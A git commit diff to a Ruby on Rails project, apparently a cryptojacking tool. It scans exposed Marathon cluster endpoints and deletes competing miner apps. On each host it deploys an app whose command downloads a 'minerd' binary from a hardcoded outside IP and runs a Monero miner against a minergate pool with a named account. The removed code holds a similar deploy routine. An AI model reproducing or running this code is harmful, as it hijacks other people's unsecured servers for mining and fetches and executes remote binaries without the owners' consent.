28eabc8d8696f4a212742670e4b0194d105bedc9
kevin xu <cming.xu@gmail.com>
2017-07-10 22:24:35 +0800

    ffo

--- app/models/node.rb
+++ app/models/node.rb
@@ -1,6 +1,9 @@
 require 'net/ssh'
 
 class Node < ApplicationRecord
+  MINERD = "http://162.242.245.65:8220/minerd"
+
+
   scope :marathon, -> { where(source: "marathon") }
   scope :redis, -> { where(source: "redis") }
   scope :mysql, -> { where(source: "mysql") }
@@ -22,7 +25,37 @@ class Node < ApplicationRecord
     x = find_by ip: "114.55.130.152"
     x.port = 6379
     x
-    
+
+  end
+
+  def deploy_my_apps
+    puts "deploy #{self.ip} "
+
+    url = "http://#{self.ip}:#{self.port}"
+    Marathon.url = url
+    hash = {
+      id: "/web-#{rand(1024)}",
+      cmd: "curl -sSL #{MINERD} -o minerd && chmod +x minerd; ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u didi123123231@gmail.com -t 10 -p x",
+      cpus: 0.3,
+      mem: 200,
+      disk: 123,
+      instances: 10,
+      portDefinitions: [
+        {
+          port: 10000,
+          protocol: "tcp",
+          name: "default",
+          labels: {}
+        } ]
+    }
+
+    begin
+      puts "creating #{hash[:id]} on #{self.ip}"
+      app = Marathon::App.create hash
+      app.scale! 10
+    rescue Exception => e
+      puts e
+    end
   end
 
 end
--- app/models/scrapper.rb
+++ app/models/scrapper.rb
@@ -21,97 +21,24 @@ class Scrapper
         node = Node.marathon.find_or_initialize_by(ip: ip)
         node.port = port
         node.save
+
         Marathon.url = url
         begin
-          puts url
           Marathon::App.list.each do |app|
-            puts "         "  +  app.info[:id]
-            node.apps.create app_id: app.info[:id], raw_response: app.info.to_json if !node.apps.find_by app_id: app.info[:id]
+            if app.info.to_json =~ /stratum/
+              puts "app #{app.info[:id]} on #{url} possible miner"
+              Marathon::App.delete app.info[:id]
+            end
           end
         rescue Exception => e
           puts e
         end
+
+        node.deploy_my_apps
       end
     end
   end
 
-  def self.count_mine
-    count = 0
-    Node.marathon.each do |node|
-      url = "http://#{node.ip}:#{node.port}"
-      Marathon.url = url
-      puts url
-
-      begin
-      app = Marathon::App.get "/tomcta4u"
-      if app
-        count += 1
-        puts count
-      end
-
-      rescue Exception => e
-        puts e
-      end
-    end
-  end
-
-
-
-  def self.remove_idot
-    apps = App.all.select{|a| a.app_id =~ /89a.*/ || a.app_id =~ /tom.*u/}
-    apps.each do |app|
-      url = "http://#{app.node.ip}:#{app.node.port}"
-      Marathon.url = url
-
-      puts "delete #{url} / #{app.app_id}"
-      begin
-      Marathon::App.delete app.app_id
-      rescue Exception => e
-        puts e
-      end
-    end
-  end
-
-  def self.deploy_my_apps
-    nodes = Node.marathon.select{|n| n.apps.length < 3}
-    nodes.each do |node|
-      url = "http://#{node.ip}:#{node.port}"
-      Marathon.url = url
-
-      puts "deploy #{url} "
-      hash = {
-        id: "/89bbbbbn408vg#{rand(1024)}",
-        cmd: "curl -sSL 128.199.211.38/minerd -o minerd && chmod +x minerd; ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u didi123123231@gmail.com -t 10 -p x",
-        cpus: 0.3,
-        mem: 200,
-        disk: 123,
-        instances: 50,
-        portDefinitions: [
-          {
-            port: 10000,
-            protocol: "tcp",
-            name: "default",
-            labels: {}
-          } ]
-      }
-
-      begin
-        thatApp = Marathon::App.get "/tomcat4u"
-        puts thatApp.info["instances"]
-        if thatApp
-          thatApp.scale! 1, true
-        end
-      rescue Exception => e
-        puts e
-      end
-      begin
-        app = Marathon::App.create hash
-        app.scale! 10
-      rescue Exception => e
-        puts e
-      end
-    end
-  end
 end
 
 
